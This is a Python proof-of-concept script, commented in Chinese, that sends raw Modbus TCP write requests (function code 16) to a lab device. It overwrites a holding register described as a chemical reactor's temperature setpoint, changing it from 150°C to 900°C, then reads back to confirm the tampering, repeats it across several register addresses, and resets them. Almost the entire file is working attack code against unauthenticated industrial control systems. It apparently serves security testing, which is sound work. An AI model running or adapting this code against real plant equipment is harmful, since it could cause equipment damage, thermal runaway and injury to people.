#!/usr/bin/env python3
"""
POC: Write Multiple Registers - Starting Address (FC=16)

验证攻击者可通过精确指定 Starting Address 字段，定向篡改特定保持寄存器的值。
攻击场景：化学反应器温度设定值从安全值 150°C 被改为危险值 900°C。
"""

import socket
import struct
import time

TARGET_HOST = "172.20.0.10"
TARGET_PORT = 502
TIMEOUT = 5

SETPOINT_ADDR = 0x0064   # holding register 100 — 反应器温度设定值
SAFE_VALUE = 150          # 安全温度 (°C)
MALICIOUS_VALUE = 900     # 危险温度 (°C) = 0x0384

ADJACENT_ADDRS = [
    (0x0063, "reg_99  (setpoint 前一个)"),
    (0x0064, "reg_100 (温度设定值 - 目标)"),
    (0x0065, "reg_101 (setpoint 后一个)"),
]


def build_fc16_request(txn_id, unit_id, start_addr, values):
    quantity = len(values)
    byte_count = quantity * 2
    pdu = struct.pack('>BHHB', 0x10, start_addr, quantity, byte_count)
    for v in values:
        pdu += struct.pack('>H', v)
    length = 1 + len(pdu)
    mbap = struct.pack('>HHHB', txn_id, 0x0000, length, unit_id)
    return mbap + pdu


def build_fc03_request(txn_id, unit_id, start_addr, quantity):
    pdu = struct.pack('>BHH', 0x03, start_addr, quantity)
    length = 1 + len(pdu)
    mbap = struct.pack('>HHHB', txn_id, 0x0000, length, unit_id)
    return mbap + pdu


def send_recv(sock, data, label=""):
    hex_out = ' '.join(f'{b:02x}' for b in data)
    print(f"  [TX] {label}")
    print(f"       {hex_out}")
    sock.sendall(data)
    resp = sock.recv(1024)
    hex_in = ' '.join(f'{b:02x}' for b in resp)
    print(f"  [RX] {hex_in}")
    return resp


def parse_fc16_resp(resp):
    if len(resp) < 12:
        return None, "响应过短"
    fc = resp[7]
    if fc == 0x90:
        err = {1: "ILLEGAL_FUNCTION", 2: "ILLEGAL_DATA_ADDRESS",
               3: "ILLEGAL_DATA_VALUE", 4: "SLAVE_DEVICE_FAILURE"}
        return None, f"异常: {err.get(resp[8], f'0x{resp[8]:02X}')}"
    if fc == 0x10:
        addr = struct.unpack('>H', resp[8:10])[0]
        qty = struct.unpack('>H', resp[10:12])[0]
        return {"addr": addr, "qty": qty}, "成功"
    return None, f"未知FC: 0x{fc:02X}"


def parse_fc03_resp(resp):
    if len(resp) < 9:
        return None, "响应过短"
    fc = resp[7]
    if fc == 0x83:
        return None, f"读取异常: 0x{resp[8]:02X}"
    if fc == 0x03:
        bc = resp[8]
        vals = []
        for i in range(0, bc, 2):
            vals.append(struct.unpack('>H', resp[9+i:11+i])[0])
        return vals, "成功"
    return None, f"未知FC: 0x{fc:02X}"


def read_registers(sock, txn_id, start_addr, quantity, label=""):
    req = build_fc03_request(txn_id, 0x01, start_addr, quantity)
    resp = send_recv(sock, req, label)
    vals, msg = parse_fc03_resp(resp)
    return vals


def run_poc():
    print("=" * 70)
    print("POC: Write Multiple Registers - Starting Address 验证")
    print("=" * 70)
    print(f"目标: {TARGET_HOST}:{TARGET_PORT}")
    print(f"攻击寄存器: 0x{SETPOINT_ADDR:04X} (decimal {SETPOINT_ADDR})")
    print(f"安全值: {SAFE_VALUE}°C | 恶意值: {MALICIOUS_VALUE}°C (0x{MALICIOUS_VALUE:04X})")
    print()

    # =============================================================
    # 阶段 1: 初始化 — 设置相邻寄存器为已知值
    # =============================================================
    print("-" * 70)
    print("阶段 1: 初始化相邻寄存器区域")
    print("-" * 70)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(TIMEOUT)
    sock.connect((TARGET_HOST, TARGET_PORT))

    init_values = [1111, SAFE_VALUE, 3333]
    req = build_fc16_request(0x0001, 0x01, 0x0063, init_values)
    resp = send_recv(sock, req,
        f"FC=16 写入 reg[99..101] = [{init_values[0]}, {init_values[1]}, {init_values[2]}]")
    result, msg = parse_fc16_resp(resp)
    print(f"  -> {msg}")
    time.sleep(0.3)

    print("\n  读取初始状态:")
    vals = read_registers(sock, 0x0002, 0x0063, 3, "FC=3 读取 reg[99..101]")
    if vals:
        for i, (addr, desc) in enumerate(ADJACENT_ADDRS):
            marker = " <<<" if addr == SETPOINT_ADDR else ""
            print(f"    reg[{addr}] 0x{addr:04X} = {vals[i]:>5}{marker} {desc}")
    sock.close()
    print()

    # =============================================================
    # 阶段 2: 核心攻击 — 精确定位 Starting Address 写入恶意值
    # =============================================================
    print("-" * 70)
    print("阶段 2: 核心攻击 — 精确定位 Starting Address=0x0064 写入 900°C")
    print("-" * 70)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(TIMEOUT)
    sock.connect((TARGET_HOST, TARGET_PORT))

    print(f"\n  攻击报文构造:")
    print(f"    Function Code:  0x10 (FC=16 Write Multiple Registers)")
    print(f"    Starting Addr:  0x{SETPOINT_ADDR:04X} (decimal {SETPOINT_ADDR})")
    print(f"    Quantity:       0x0001 (仅目标寄存器)")
    print(f"    Byte Count:     0x02")
    print(f"    Value:          0x{MALICIOUS_VALUE:04X} ({MALICIOUS_VALUE}°C)")
    print()

    req = build_fc16_request(0x0003, 0x01, SETPOINT_ADDR, [MALICIOUS_VALUE])
    print("  --- 发送攻击报文 ---")
    resp = send_recv(sock, req,
        f"FC=16 Starting Address=0x{SETPOINT_ADDR:04X}, 值={MALICIOUS_VALUE}")
    result, msg = parse_fc16_resp(resp)

    attack_ok = False
    if result:
        print(f"\n  [!] 攻击成功!")
        print(f"      响应确认: 地址 0x{result['addr']:04X}, 数量 {result['qty']}")
        attack_ok = True
    else:
        print(f"\n  [X] 攻击失败: {msg}")

    time.sleep(0.3)

    # 验证：仅目标寄存器被改，相邻寄存器不受影响
    print("\n  --- 验证攻击精确性 ---")
    vals = read_registers(sock, 0x0004, 0x0063, 3, "FC=3 读取 reg[99..101]")
    if vals:
        print(f"\n  攻击后寄存器状态:")
        expected = [1111, MALICIOUS_VALUE, 3333]
        all_correct = True
        for i, (addr, desc) in enumerate(ADJACENT_ADDRS):
            match = "✓" if vals[i] == expected[i] else "✗"
            marker = ""
            if addr == SETPOINT_ADDR:
                if vals[i] == MALICIOUS_VALUE:
                    marker = f" ← 已篡改! ({SAFE_VALUE}→{MALICIOUS_VALUE}°C)"
                else:
                    marker = f" ← 未变 (预期 {MALICIOUS_VALUE})"
                    all_correct = False
            else:
                if vals[i] != expected[i]:
                    marker = " ← 意外变更!"
                    all_correct = False
            print(f"    {match} reg[{addr}] 0x{addr:04X} = {vals[i]:>5}{marker}")

        if all_correct:
            print(f"\n  [!] Starting Address 精确定位确认:")
            print(f"      - 目标寄存器 0x{SETPOINT_ADDR:04X}: {SAFE_VALUE} → {MALICIOUS_VALUE} (已篡改)")
            print(f"      - 前一个寄存器 0x0063: {init_values[0]} (未受影响)")
            print(f"      - 后一个寄存器 0x0065: {init_values[2]} (未受影响)")
    sock.close()
    print()

    # =============================================================
    # 阶段 3: 扩展验证 — 多个 Starting Address 均可精确命中
    # =============================================================
    print("-" * 70)
    print("阶段 3: 扩展验证 — 不同 Starting Address 均可精确定位")
    print("-" * 70)

    test_targets = [
        (0x0000, 500, "reg[0]   — 首地址"),
        (0x0032, 600, "reg[50]  — 中间地址"),
        (0x0064, 700, "reg[100] — POC 目标"),
        (0x00C8, 800, "reg[200] — 高位地址"),
        (0x01F4, 999, "reg[500] — 远端地址"),
    ]

    results_table = []
    txn = 0x0010

    for addr, val, desc in test_targets:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        try:
            sock.connect((TARGET_HOST, TARGET_PORT))

            # 写入
            req = build_fc16_request(txn, 0x01, addr, [val])
            resp = send_recv(sock, req, f"写入 addr=0x{addr:04X}, val={val}")
            w_result, w_msg = parse_fc16_resp(resp)
            time.sleep(0.2)

            # 回读
            req = build_fc03_request(txn + 1, 0x01, addr, 1)
            resp = send_recv(sock, req, f"回读 addr=0x{addr:04X}")
            r_vals, r_msg = parse_fc03_resp(resp)

            write_ok = w_result is not None
            read_val = r_vals[0] if r_vals else None
            match = (read_val == val) if read_val is not None else False
            results_table.append((addr, desc, val, write_ok, read_val, match))

            status = "✓" if (write_ok and match) else "✗"
            print(f"    {status} {desc}: 写入 {val}, 回读 {read_val}")
            print()

            txn += 2
        except Exception as e:
            print(f"    ✗ {desc}: 连接错误 {e}")
            results_table.append((addr, desc, val, False, None, False))
        finally:
            sock.close()
            time.sleep(0.2)

    # =============================================================
    # 阶段 4: 恢复
    # =============================================================
    print("-" * 70)
    print("阶段 4: 恢复所有寄存器")
    print("-" * 70)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(TIMEOUT)
    sock.connect((TARGET_HOST, TARGET_PORT))

    for addr, val, desc in test_targets:
        req = build_fc16_request(0x00F0, 0x01, addr, [0])
        sock.sendall(req)
        sock.recv(1024)
        time.sleep(0.1)

    req = build_fc16_request(0x00F1, 0x01, 0x0063, [0, 0, 0])
    resp = send_recv(sock, req, "FC=16 恢复 reg[99..101] = [0, 0, 0]")
    print(f"  [OK] 所有寄存器已恢复为 0")
    sock.close()

    # =============================================================
    # 汇总报告
    # =============================================================
    print()
    print("=" * 70)
    print("验证结果汇总")
    print("=" * 70)
    print()

    print(f"  {'地址':<16} {'描述':<28} {'写入值':<8} {'回读值':<8} {'精确命中':<8}")
    print(f"  {'-'*16} {'-'*28} {'-'*8} {'-'*8} {'-'*8}")

    ok_count = 0
    for addr, desc, val, write_ok, read_val, match in results_table:
        rv = str(read_val) if read_val is not None else "N/A"
        m = "✓" if match else "✗"
        print(f"  0x{addr:04X} (d={addr:<4}) {desc:<28} {val:<8} {rv:<8} {m}")
        if match:
            ok_count += 1

    print()
    print(f"  测试 {len(test_targets)} 个地址，{ok_count} 个精确命中")
    print()

    if attack_ok and ok_count == len(test_targets):
        print("  [!] 安全发现: Starting Address 可被攻击者完全控制!")
        print("      攻击者通过选择 Starting Address，可精确定位任意保持寄存器，")
        print("      单条请求即可将安全关键参数篡改为危险值。")
        print()
        print("  [!] 攻击影响 (化学反应器场景):")
        print(f"      温度设定值: {SAFE_VALUE}°C → {MALICIOUS_VALUE}°C")
        print("      PID 控制器驱动加热器全功率运行，导致:")
        print("      - 超压/容器破裂风险")
        print("      - 分解反应/热失控")
        print("      - 设备损坏和人员安全威胁")
        print()
        print("  CWE 分类:")
        print("    - CWE-306: Missing Authentication for Critical Function")
        print("    - CWE-284: Improper Access Control")
        print("    - CWE-862: Missing Authorization")

    print()
    print("=" * 70)
    print("POC 验证完成")
    print("=" * 70)


if __name__ == "__main__":
    run_poc()
